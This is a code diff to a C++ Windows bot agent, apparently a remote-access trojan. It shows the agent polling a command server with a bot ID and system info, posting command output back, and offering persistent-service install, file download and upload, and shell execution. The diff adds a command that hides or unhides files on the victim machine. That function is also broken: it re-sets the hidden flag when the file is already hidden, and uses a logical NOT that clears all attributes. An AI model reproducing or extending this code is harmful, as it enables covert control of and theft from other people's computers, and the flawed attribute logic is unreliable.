@@ -3,6 +3,9 @@
 
 using namespace std;
 
+/*
+Constructor of the Class
+*/
 
 Agent::Agent(const std::string& _server_url, const std::string& _botid, const unsigned int _sleep_interval, const std::string& _service_name, const std::string& _user_agent) {
 	if (_botid.empty()) {
@@ -19,6 +22,9 @@ Agent::Agent(const std::string& _server_url, const std::string& _botid, const un
 	running = false;
 }
 
+/*
+PRIVATE Functions
+*/
 
 string Agent::get_hostname() {
 	char hostname[MAX_COMPUTERNAME_LENGTH + 1];
@@ -35,10 +41,8 @@ string Agent::get_os_name() {
 
 
 string Agent::get_wd() {
-
 	char cwd[MAX_PATH];
 	GetCurrentDirectoryA(MAX_PATH, cwd);
-
 	return cwd;
 }
 
@@ -46,13 +50,18 @@ string Agent::get_wd() {
 string Agent::get_next_command() {
 	std::vector<unsigned char> _cmd = http_request(server_url + "/api/pop?botid=" + botid + "&sysinfo=" + os_name, "GET", NULL, NULL, "", user_agent);
 
+	int wchars_num;
+	char* str;
+	wchar_t* wstr;
+
 	string cmd(_cmd.begin(), _cmd.end());
-    int wchars_num = MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, NULL, 0);
-	wchar_t* wstr = new wchar_t[wchars_num];
+    wchars_num = MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, NULL, 0);
+	wstr = new wchar_t[wchars_num];
 	MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, wstr, wchars_num);
-	char* str = new char[wchars_num];
+	str = new char[wchars_num];
 	wcstombs(str, wstr, wchars_num);
 	cmd = string(str);
+
 	delete[] wstr;
 	delete[] str;
 	return cmd;
@@ -66,6 +75,22 @@ void Agent::send_output(const std::string& output) {
 	sprintf(postData, "output=%s&botid=%s", url_encoded.c_str(), botid.c_str());
 	http_request(server_url + "/api/report", "POST", postData, postSize, "Content-Type: application/x-www-form-urlencoded; charset=ISO-8859-1", user_agent);
 	delete[] postData;
+}
+
+/*
+PUBLIC functions
+*/
+
+void Agent::hide_unhide_file(const std::string& filename) {
+	DWORD dwAttrs;
+	LPCSTR FileNameStr;
+
+	FileNameStr = (LPCSTR)filename.c_str();
+	dwAttrs = GetFileAttributes(FileNameStr);
+	if (dwAttrs & FILE_ATTRIBUTE_HIDDEN)
+		SetFileAttributesA(FileNameStr, (dwAttrs | FILE_ATTRIBUTE_HIDDEN));
+	else
+		SetFileAttributes(FileNameStr, (dwAttrs & !FILE_ATTRIBUTE_HIDDEN));
 }
 
 
@@ -150,6 +175,7 @@ void Agent::help() {
 		"persistence install|clean: install/remove persistent service\r\n"
 		"open <calc.exe>: run command asynchronously (no output)\r\n"
 		"download <http://url>: download file\r\n"
+		"hide_unhide <local/file>: Hide or unHide a local file\r\n"
 		"upload <local/file>: upload file\r\n"
 		"help: this help\r\n"
 		"exit: kill agent\r\n"
@@ -371,6 +397,10 @@ void Agent::execute(const std::string& commandline) {
 	// name of the persistent service
 	else if (command == "setservicename") {
 		setServiceName(args);
+	}
+	// hide of unhide a file
+	else if (command == "hide_unhide") {
+		hide_unhide_file(args);
 	}
 	// if this is a single line, run the command through a shell
 	else if (commandline.find("\n") == string::npos) {
